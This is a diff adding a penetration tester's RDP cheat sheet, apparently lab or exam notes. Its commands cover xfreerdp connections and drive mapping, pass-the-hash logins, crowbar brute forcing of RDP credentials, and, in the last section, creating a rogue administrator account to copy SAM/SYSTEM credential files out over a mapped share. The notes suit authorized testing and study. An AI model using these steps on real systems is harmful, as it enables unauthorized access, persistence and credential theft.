@@ -1,1 +1,37 @@
+RDP
+Connect to a host using xfreerdp
+xfreerdp /u:mydomain\\peter /p:password /v:192.168.0.x
 
+Share a local folder with the remote host
+rdesktop -u peter -p password -r disk:shared=/home/kali/shared 192.168.0.x
+
+Pass the hash using xfreerdp
+xfreerdp /u:domain\\user /pth:HASH /v:192.168.0.20
+
+Bruteforce RDP credentials
+crowbar -b rdp -s 192.168.0.20/32 -U usernames_file -C passwords_file
+
+Shared Drive
+also add  /drive:home,/home/kali to mount smb on your rdp.
+For easy file transfer, you can check C:\ and you will see your Kali share mounted. and just transfer files from there
+
+example:
+xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:192.168.215.145 /u:USER /p:PASS /drive:home,/home/kali
+xfreerdp /dynamic-resolution +clipboard /cert-ignore /u:backup_service /v:10.10.87.x /p:It4Server /drive:home,/home/kali/scripts/windows
+
+network attached drive
+ xfreerdp /v:ip_address /u:username /p:password /drive:path/to/directory,share_name
+   
+xfreerdp: Connect to a FreeRDP server with clipboard redirection.
+$ xfreerdp /v:${ip_address} /u:${username} /p:${password} +clipboard
+
+xfreerdp: Connect to a FreeRDP server with a shared directory.
+$ xfreerdp /v:${ip_address} /u:${username} /p:${password} /drive:${path-to-directory},${share_name}
+
+Adding user to RDP group (Windows)
+cmd.exe /c net user wintermute SuperPassword123! /add /y ← Had to figure out /y, was having troubles accepting my input so tried to auto yes it and had success
+cmd.exe /c net localgroup Administrators wintermute /add ← Added myself to the administrator group
+cmd.exe /c net localgroup "Remote Desktop Users" wintermute /add ← Added myself to Remote Desktop users Group
+
+-After creating new Admin user wintermute i could RDP into the box with a mapped share drive to transfer SAM/SYSTEM files
+└─$ xfreerdp /dynamic-resolution +clipboard /cert-ignore /u:wintermute /v:172.16.x.x /p:SuperPassword123! /drive:home,/home/kali/scripts/windows ← mapped shared drive
